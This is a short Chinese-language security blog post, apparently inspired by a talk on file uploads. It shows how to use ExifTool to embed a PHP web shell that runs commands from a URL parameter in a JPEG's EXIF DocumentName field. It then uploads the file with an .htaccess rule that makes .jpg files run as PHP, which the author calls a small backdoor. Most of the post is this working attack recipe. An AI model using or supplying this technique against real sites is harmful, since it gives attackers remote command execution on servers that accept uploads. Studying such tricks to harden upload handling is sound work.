---
layout: post
title: "Image exif tool"
date: 2013-02-27 15:58
comments: true
categories: Security
---

最近在網路上找Image exif的修改工具 for Mac，

最後找到 [ExifTool][exiftool]

不過，為什麼要找Exif的修改工具呢？

其實是在看到[Orange][orange]在Web Conf所講的[Talk][o-talk]後才想找的，

安裝完 [ExifTool][exiftool] 之後，

1.觀看圖片的Exif資訊

    $ exiftool test.jpg

2.修改圖片的Exif資訊，e.g., Document Name
    $ exiftool exiftool -documentname='<?php passthru($_GET[cmd]); __halt_compiler();?>' test.jpg
    $ file test.jpg
    ./test.jpg JPEG: image data, JFIF standard 1.01

大概是像上面這樣，

所以我們可以透過上傳test.jpg 以及 .htaccess

    $ cat .htaccess
    addhandler application/x-httpd-php .jpg

這是為了做什麼？

上傳後執行可以看到這樣的畫面

![image upload][imageup1]

<br>

![image upload][imageup2]

其實就是個小後門!


[exiftool]: http://www.sno.phy.queensu.ca/~phil/exiftool/
[o-talk]: http://www.slideshare.net/p8361/webconf-2013best-practices-the-upload
[imageup1]: images/imageup1.png "image upload"
[imageup2]: images/imageup2.png "image upload"
[orange]: http://blog.orange.tw
